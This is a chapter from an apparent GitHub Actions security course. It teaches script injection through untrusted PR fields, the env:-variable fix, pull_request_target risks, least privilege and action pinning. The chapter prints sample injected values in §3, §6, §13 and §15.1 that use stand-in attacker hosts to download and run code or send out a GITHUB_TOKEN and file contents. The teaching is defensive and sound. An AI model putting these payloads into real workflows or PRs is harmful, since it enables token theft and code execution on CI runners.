# Chapter 18: Security

**Reading Time:** ~55 minutes
**Prerequisites:** Chapter 09 (The Event Model), Chapter 11 (Tokens & Permissions)
**Practice Notebook:** `notebooks/practice_18.ipynb`
**Reference Notebook:** `notebooks/lab_18_security.ipynb`
**Script:** `labs/lab_18_security.py`
**Doc Reference:** GitHub Docs "Security hardening for GitHub Actions"
**Depth:** Core

---

## Beginner's Guide

**What to focus on first:** Sections 3–7 — script injection, the single most underrated
vulnerability class in this whole domain, and the one this chapter spends the most time on because
Chapter 09 already covered `pull_request_target` in depth.

**What to SKIP on first read:** Section 11 (supply-chain risk from third-party actions). Return
once you're adding a `uses:` step from outside `actions/*`.

**Key concepts in plain English:**

- **Script injection:** Untrusted text (a PR title, an issue body) substituted directly into a
  `run:` block becomes part of the shell command itself, not quoted data — an attacker who controls
  that text can make the shell run whatever they want.
- **`env:` indirection:** The fix for script injection — route untrusted values through an `env:`
  variable and reference them as `"$VAR"` in the shell, so the shell treats them as one quoted
  string, never as command syntax.
- **The `pull_request_target` footgun:** Already covered in Chapter 09 §4 — secrets plus a
  checkout of the PR's own untrusted code, combined, is the single most severe pattern in this
  curriculum.
- **Least privilege, restated:** Chapter 11's `permissions:` scoping is itself a security control —
  the smaller the blast radius a compromised step has, the less a successful injection can do.
- **Supply-chain risk:** A third-party `uses:` action is code you didn't write, running with
  whatever permissions your job grants it — pinning to a full commit SHA (not just a version tag)
  is the strongest defense.

**Your prior knowledge connection:** If you've ever built a SQL query with string concatenation
instead of parameterized queries and gotten burned by SQL injection, script injection here is the
exact same class of bug in a different substitution engine — untrusted text treated as code instead
of data.

---

> **🔬 Automation Engineer's Lens:** Script injection is more dangerous than `pull_request_target`
> misuse in one specific way: it doesn't require any unusual trigger choice at all. A perfectly
> ordinary `pull_request`-triggered workflow, with no secrets, no elevated permissions, can still be
> exploited if a step's `run:` block interpolates an untrusted field directly — the attacker's
> payload runs *inside the runner*, and from there can read anything that runner's own
> `GITHUB_TOKEN` can reach, exfiltrate repo contents, or pivot to whatever else that job's
> permissions allow. This is the vulnerability class most workflows in the wild actually ship with,
> because it looks completely innocuous in the YAML.

---

> **🚦 Native vs Custom:** GitHub provides the `env:` indirection mechanism natively — nothing to
> build there. What's entirely your responsibility is *noticing* the unsafe pattern in the first
> place: GitHub does not warn you, lint you, or refuse to run a workflow that interpolates
> `github.event.pull_request.title` directly into `run:`. This chapter's lab script is exactly the
> kind of detector that could catch this in CI for your own workflow files, because nothing native
> does it for you.

---

## What You'll Learn

- Exactly how script injection works: text substitution before the shell ever runs
- The `env:` indirection fix, and why quoting alone in the `run:` block isn't enough
- How to build a simple detector for direct interpolation of untrusted fields
- The full, precise version of the `pull_request_target` danger from Chapter 09 §4
- What least-privilege `permissions:` scoping buys you even after an injection succeeds
- Why pinning third-party actions to a commit SHA, not just a tag, matters

---

## Table of Contents

- [Chapter 18: Security](#chapter-18-security)
  - [Beginner's Guide](#beginners-guide)
  - [What You'll Learn](#what-youll-learn)
  - [Table of Contents](#table-of-contents)
  - [1. The Two Vulnerability Classes This Chapter Covers](#1-the-two-vulnerability-classes-this-chapter-covers)
  - [2. Script Injection: The Mechanism](#2-script-injection-the-mechanism)
  - [3. Seeing the Literal Substitution](#3-seeing-the-literal-substitution)
  - [4. Why Quoting the `${{ }}` Directly Doesn't Save You](#4-why-quoting-the---directly-doesnt-save-you)
  - [5. The Fix: `env:` Indirection](#5-the-fix-env-indirection)
  - [6. Which Fields Are Untrusted](#6-which-fields-are-untrusted)
  - [7. Building a Detector](#7-building-a-detector)
  - [8. `pull_request_target`, Precisely](#8-pull_request_target-precisely)
  - [9. Least Privilege as a Damage-Limitation Control](#9-least-privilege-as-a-damage-limitation-control)
  - [10. ⚠️ ADVANCED: Third-Party Action Supply-Chain Risk](#10-️-advanced-third-party-action-supply-chain-risk)
  - [11. ⚠️ ADVANCED: Pinning to a Commit SHA vs a Tag](#11-️-advanced-pinning-to-a-commit-sha-vs-a-tag)
  - [12. ⚠️ ADVANCED: Secrets in Logs](#12-️-advanced-secrets-in-logs)
  - [13. Case Study: An Injected PR Title Exfiltrating a Token](#13-case-study-an-injected-pr-title-exfiltrating-a-token)
  - [14. Case Study: This Repo's Own Workflows, Audited](#14-case-study-this-repos-own-workflows-audited)
  - [15. Practical Tips: A Pre-Merge Security Checklist for New Workflows](#15-practical-tips-a-pre-merge-security-checklist-for-new-workflows)
  - [16. Common Pitfalls \& Misconceptions](#16-common-pitfalls--misconceptions)
  - [17. Key Takeaways](#17-key-takeaways)
  - [18. What's Next: Chapter 19 — Calibrating the Threshold](#18-whats-next-chapter-19--calibrating-the-threshold)
  - [19. Additional Resources](#19-additional-resources)
  - [20. Appendix A — Code Index](#20-appendix-a--code-index)
    - [A.1 — Detecting and Fixing Script Injection (from Section 7)](#a1--detecting-and-fixing-script-injection-from-section-7)

---

## 1. The Two Vulnerability Classes This Chapter Covers

This chapter has two halves: script injection (Sections 2–7, new material) and a deeper, precise
treatment of `pull_request_target` (Section 8, building on Chapter 09 §4). Both share a root cause
— untrusted, attacker-controlled text ending up somewhere it can act rather than merely being
displayed — but they're different mechanisms with different fixes.

## 2. Script Injection: The Mechanism

`${{ }}` expressions (Chapter 10 §3) are substituted as **plain text**, by GitHub's workflow
engine, *before* the runner's shell ever sees the resulting command. This is the entire mechanism:

```
YAML author writes:   run: echo "Processing: ${{ github.event.pull_request.title }}"
                                          │
                          GitHub substitutes the PR title's literal text
                                          │
                                          ▼
Shell actually runs: echo "Processing: <whatever the PR title's raw text was>"
```

If the PR title is ordinary text, nothing goes wrong. If the PR title *itself* contains shell
syntax, the shell can't tell attacker-authored text apart from the workflow author's own command —
because by the time the shell runs, they've been concatenated into one string.

## 3. Seeing the Literal Substitution

A PR title of `fix: typo"; curl evil.example/x | bash #` substituted into the template above
produces:

```
echo "Processing: fix: typo"; curl evil.example/x | bash #"
```

Read that as a shell would: the first `"` after `typo` closes the `echo` command's quoted string
early; `;` starts a new command; `curl evil.example/x | bash` downloads and executes attacker
content; `#` comments out the trailing, now-syntactically-orphaned quote. The PR title *is* the
exploit — no separate delivery mechanism needed.

## 4. Why Quoting the `${{ }}` Directly Doesn't Save You

A natural but insufficient instinct: "I already wrapped it in quotes, `echo "..."`, doesn't that
protect me?" No — the substitution happens *before* the shell parses anything, so an attacker who
controls the substituted text can simply include a closing quote of their own (as Section 3 shows)
and escape the quoting the workflow author wrote. Quoting protects against *shell metacharacters
you don't control*; it does nothing against text that can supply its own quote characters.

## 5. The Fix: `env:` Indirection

```yaml
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
run: |
  echo "Processing: $PR_TITLE"
```

This works because the substitution now happens *once*, into an environment variable's *value* —
GitHub Actions sets `PR_TITLE` as a genuine environment variable via the runner's environment, not
as text pasted into the command line. The shell then references `$PR_TITLE` (quoted) as a single
opaque string — no matter what characters it contains, the shell treats it as **data**, never as
command syntax to re-parse. This is the single correct fix; there is no safe way to interpolate
untrusted text directly into `run:` at all.

## 6. Which Fields Are Untrusted

This is the canonical taxonomy for the whole curriculum — Chapter 09 §4 points here for the
field-by-field split. The rule is simple: any context field whose value an outside contributor
can set counts as **untrusted** and must never reach a `run:` block directly; fields the platform
computes or that name permanent repo facts are **generally trusted**. "Generally" is load-bearing —
GitHub guarantees nothing, so the trusted column means "platform-generated, unlikely to be an
injection vector," not "safe to `eval`."

| Generally trusted (platform-generated / permanent)   | Attacker-controllable (outside contributor sets the text) |
| ---------------------------------------------------- | --------------------------------------------------------- |
| `github.repository` — repo name (permanent)          | `github.event.pull_request.title` · `.body`               |
| `github.sha` — a computed 40-char hash, not free text | `github.event.issue.title` · `.body`                     |
| `github.event.pull_request.number` — e.g. `101`      | `github.event.comment.body` · `github.event.review.body`  |
| `github.run_id` · `github.run_number`                | `github.event.commits.*.message` · `head_commit.message`  |
| `github.event.pull_request.head.sha` (the hash itself)| `github.head_ref` · `...head.ref` · `...head.label`       |
| values *you* set yourself in the workflow file       | `...author.email` · `...author.name` · PR labels          |

Two easy traps in the right-hand column. **Branch names** (`github.head_ref`) feel like
machine-generated identifiers, but a fork author picks their own branch name — `fix/typo` or
`$(curl attacker.example)` are equally valid Git refs. **Author email and name** feel validated,
but the local-part of an email address may legally contain `` !#$%&'*+-/=?^_`{|}~ `` — plenty of
shell metacharacters. Treat both as raw attacker text.

`secrets.*` is a different risk category entirely (Section 12), not part of this trusted/untrusted
split. And note the two `head` SHAs vs refs: `head.sha` is a computed hash (trusted as *text*, even
though checking out the *code* it names is the `pull_request_target` footgun of Section 8), while
`head.ref` and `head.label` are attacker-chosen strings.

## 7. Building a Detector

This chapter's lab implements exactly this: scan a `run:` block's text for any
`${{ <untrusted-field> }}` pattern, appearing directly rather than routed through `env:`. This is a
simple, mechanical check — no AI, no deep parsing, just a list of known-untrusted field names and a
regex — and it's exactly the kind of check that could run as its own CI step over this repo's (or
any repo's) `.github/workflows/*.yml` files, since GitHub itself performs no such check for you.

## 8. `pull_request_target`, Precisely

Chapter 09 §4 introduced this; here's the precise statement. `pull_request_target` checks out the
**base** branch by default and grants secrets unconditionally, even to fork PRs. The vulnerability
requires *combining* it with an explicit step that checks out the PR's own head
(`ref: ${{ github.event.pull_request.head.sha }}`) — at that point, subsequent steps in the same
job execute attacker-controlled code (from the fork) with secrets present. Absent that explicit
checkout, `pull_request_target` alone (used only to label, comment, or read metadata from the
trusted base branch) carries none of this risk — the danger is specifically the combination, not
the trigger in isolation.

## 9. Least Privilege as a Damage-Limitation Control

Chapter 11's `permissions:` scoping (declare only what a job needs) directly limits the blast
radius of a successful script injection. A workflow scoped to `contents: read` that gets
script-injected can, at worst, read the checked-out repo and exfiltrate data it already had read
access to — a workflow scoped to `contents: write` and `secrets: <anything>` that gets injected can
do far more. Least privilege doesn't prevent injection; it bounds what a successful one can achieve.

## 10. ⚠️ ADVANCED: Third-Party Action Supply-Chain Risk

> ⚠️ **ADVANCED TOPIC:** The risk of `uses:` pulling in code you didn't write or review.
> **Skip on first read** — this repo only uses `actions/*` first-party actions.

Every `uses:` step runs arbitrary code, packaged by whoever published that action, with whatever
permissions your job grants. A compromised or malicious third-party action is a supply-chain attack
vector exactly like a compromised npm/PyPI package — the action's code executes inside your
workflow's context, with access to your secrets if the job has them. First-party `actions/*`
actions carry meaningfully lower risk than an arbitrary third-party marketplace action; this repo
uses only `actions/checkout` and `actions/setup-python`, deliberately.

## 11. ⚠️ ADVANCED: Pinning to a Commit SHA vs a Tag

> ⚠️ **ADVANCED TOPIC:** Why `@v4` is weaker than pinning to a full commit SHA.
> **Skip on first read** — `.github/instructions/workflows.instructions.md` already requires "at
> least" a major version tag for this repo; this section explains the stronger alternative.

`uses: actions/checkout@v4` pins to a *tag*, which its publisher can move to point at different
code later (whether through compromise or an unexpected breaking change) — the next run silently
picks up whatever `v4` now points to. `uses: actions/checkout@<full-40-char-sha>` pins to one
immutable commit; nothing can change what that reference resolves to, ever. This repo pins to major
version tags (the instructions file's stated minimum) rather than commit SHAs — a reasonable
trade-off for a curriculum's own low-risk sandbox, but a stronger security posture for a
higher-stakes production repo would pin to SHAs and use a bot (like Dependabot) to open PRs bumping
them deliberately.

## 12. ⚠️ ADVANCED: Secrets in Logs

> ⚠️ **ADVANCED TOPIC:** GitHub's automatic secret masking, and its limits.
> **Skip on first read.**

GitHub automatically masks any log output that exactly matches a known secret's value, replacing it
with `***`. This masking is a straightforward string match — it does **not** catch a secret that's
been transformed (base64-encoded, reversed, split across multiple log lines) before being printed.
`.github/instructions/workflows.instructions.md`'s rule ("never `echo` a secret value, even for
debugging") exists because the masking is a safety net, not a substitute for simply never printing
secret material in the first place.

## 13. Case Study: An Injected PR Title Exfiltrating a Token

Combine Sections 2–5 with a job that has `secrets: inherit` or an elevated `GITHUB_TOKEN`: an
attacker's PR title, injected via the unsafe pattern, could run
`curl -d "$GITHUB_TOKEN" https://attacker.example/collect` instead of the relatively harmless
`curl | bash` from Section 3 — silently exfiltrating a live token to an external server, inside a
workflow log that shows nothing more alarming than "Processing: <title>" if the exploit is written
carefully. This is precisely why Section 9's least-privilege scoping matters even when injection
prevention (Section 5) is also in place — defense in depth, not either/or.

## 14. Case Study: This Repo's Own Workflows, Audited

Running this chapter's detector against this repo's own five real workflow files finds zero direct
interpolations of untrusted fields — every `run:` block either uses no PR-controlled text at all,
or (where a PR number/SHA is needed) reads it through `env:` first, matching Section 5's pattern
throughout. This isn't an accident; it's the payoff of `workflows.instructions.md`'s conventions
being followed consistently from the first workflow written.

## 15. Practical Tips: A Pre-Merge Security Checklist for New Workflows

### 15.1 — Spot-the-Diff: Two Near-Identical Helper Steps

A fork contributor opens PR #101 (`fix: correct typo in sandbox README`) touching a workflow's
"comment a summary back on the PR" helper step. The step below is the version already on `main` —
it reads the PR *number*, and only comments when a prior step failed:

```yaml
# BEFORE — the step as it lives on main
- name: Comment PR summary
  if: always() && failure()
  env:
    PR_REF: ${{ github.event.pull_request.number }}
  run: echo "Reviewing PR #$PR_REF" | tee /tmp/note.txt
```

Here is the same step as the fork's PR proposes to change it. Three tokens differ. Find them
before reading on:

```yaml
# AFTER — the step as the fork PR rewrites it
- name: Comment PR summary
  if: always()
  run: echo "Reviewing ${{ github.event.pull_request.title }}" | tee /tmp/note.txt
```

**What to notice:**

- **`number` → `title`** — the trusted field (`101`, a computed integer) is swapped for an
  attacker-controlled one from §6's right-hand column. A PR titled
  `x"; curl -d @/tmp/note.txt attacker.example #` now injects a shell command exactly as §3 showed.
- **`env:` indirection deleted** — the value moved from a routed `PR_REF` variable straight into
  `run:`. That single move is the entire §5 fix, undone. Even the *old* field would now be unsafe
  if it were attacker-controlled; the new field makes it live.
- **`if: always() && failure()` → `if: always()`** — the step used to run only on a prior failure
  (a rare path a reviewer might never exercise); now it fires on **every** run, so the injection
  triggers on the attacker's very first push. The loosened condition is what turns a latent bug
  into a reliable exploit.

The lesson: a "harmless" one-line diff to a workflow file can carry a full injection in three tokens
that a fast scroll-through review will wave past. This is exactly why §15's checklist item on
CODEOWNERS ownership of `.github/workflows/` exists.



```
Before merging a new/edited workflow file
──────────────────────────────────────────────
[ ] Any run: block referencing github.event.*.title/body/comment.body directly? -> route through env:
[ ] Any pull_request_target trigger? -> confirm NO step checks out the PR's own head
[ ] permissions: declared explicitly, scoped to only what this job needs (Chapter 11 §3)
[ ] Any uses: step from outside actions/* or a trusted publisher? -> review it, consider SHA pinning
[ ] Any secret ever passed to echo/print/log, even "for debugging"? -> remove it
[ ] Is .github/workflows/ owned in CODEOWNERS AND require-code-owner-review on in branch protection?
```

The last item is the one that specifically protects an **auto-merge** pipeline. A CODEOWNERS entry
for `.github/workflows/` (the file lives in `.github/`, the repo root, or `docs/`) automatically
requests a designated reviewer on any PR that touches a workflow — but on its own it only *requests*
the review; the PR can still merge without it. The mandatory half is branch protection's "Require
review from Code Owners" toggle. Without that toggle, a §15.1-style three-token workflow diff would
sail straight through auto-merge with the owner merely pinged — fail-open, the exact inversion of
this repo's fail-closed philosophy. Owning workflow files *and* requiring the owner's approval is
what forces every change to your gates through a human door before auto-merge can open.

## 16. Common Pitfalls & Misconceptions

1. **"Quoting `${{ }}` in the run block is enough protection."** No — the text is substituted
   before the shell parses anything; attacker-supplied quote characters can still escape it
   (Section 4).

2. **"Only `pull_request_target` workflows are vulnerable to injection."** No — script injection
   works identically in a plain `pull_request`-triggered workflow with no elevated permissions;
   the damage is just typically smaller (Section 9).

3. **"GitHub would warn me if a workflow had this vulnerability."** No — GitHub performs no such
   check. Nothing in the platform flags direct interpolation of untrusted fields.

4. **"Secret masking in logs means I can print secrets safely for debugging."** No — masking is a
   straightforward string match with real gaps (Section 12); never print a secret at all.

5. **"A version tag like `@v4` is just as safe as a commit SHA."** Not against a compromised or
   malicious publisher — a tag can be moved; a commit SHA cannot (Section 11).

## 17. Key Takeaways

- **Script injection is a text-substitution bug**, not a shell-escaping bug — `${{ }}` is replaced
  before the shell ever parses the command.
- **`env:` indirection is the one correct fix** — route untrusted values through an environment
  variable, reference as `"$VAR"`, never interpolate directly into `run:`.
- **This vulnerability requires no unusual trigger** — an ordinary `pull_request` workflow with no
  secrets can still be exploited to read whatever that runner's own token can reach.
- **`pull_request_target` danger is specifically the combination** of secrets plus checking out the
  PR's own untrusted head — neither alone is the exploit.
- **Least privilege bounds the blast radius**, it doesn't prevent the injection — defense in depth
  needs both.

## 18. What's Next: Chapter 19 — Calibrating the Threshold

Chapter 19 returns to Gate 3's risk-scoring model (Chapter 16) with a hardening question of its
own: how do you know the threshold is set correctly, and how do you recalibrate it as your team's
PR patterns change over time?

[→ Chapter 19: Calibrating the Threshold](chapter_19_calibrating_threshold.md)

## 19. Additional Resources

- **GitHub Security Lab, "Keeping your GitHub Actions and workflows secure: Untrusted input"** — https://securitylab.github.com/resources/github-actions-untrusted-input/ (fetched 2026-08) — the canonical script-injection writeup
- **GitHub Docs, "Security hardening for GitHub Actions"** — https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions (fetched 2026-08)
- **GitHub Docs, "Secure use reference"** — https://docs.github.com/en/actions/reference/security/secure-use (fetched 2026-08) — the current canonical page for the intermediate-`env:`-variable mitigation (the hardening URL above now redirects here); backs §5 but does not itself enumerate the untrusted fields — the field list in §6 comes from the Security Lab writeup above
- **GitHub Docs, "About code owners"** — https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-code-owners (fetched 2026-08) — CODEOWNERS requests review automatically; making it a merge blocker requires branch protection's "Require review from Code Owners" (§15)
- **GitHub Docs, "Security hardening your deployments"** — https://docs.github.com/en/actions/deployment/security-hardening-your-deployments (fetched 2026-08) — third-party action risk
- **OpenSSF, "Compiler Options Hardening Guide"** unrelated topic but same publisher's "Scorecards" project is relevant background on supply-chain scoring for actions — https://openssf.org (fetched 2026-08)

## 20. Appendix A — Code Index

### A.1 — Detecting and Fixing Script Injection (from Section 7)

**What the code does:** Detects direct interpolation of untrusted context fields in a `run:` block,
shows literally what GitHub would substitute for a malicious PR title (without executing it), and
demonstrates the `env:`-indirection fix.

**ASCII flowchart:**

```
find_direct_interpolation(run_block) → ["github.event.pull_request.title"]  (unsafe)
simulate_unsafe_substitution(run_template, MALICIOUS_TITLE) → literal injected command (string only)
safe_env_indirection(run_template) → the fixed YAML, using env: + "$VAR"
find_direct_interpolation(fixed_run_block) → []  (safe)
```

See `labs/lab_18_security.py` for the full runnable version.
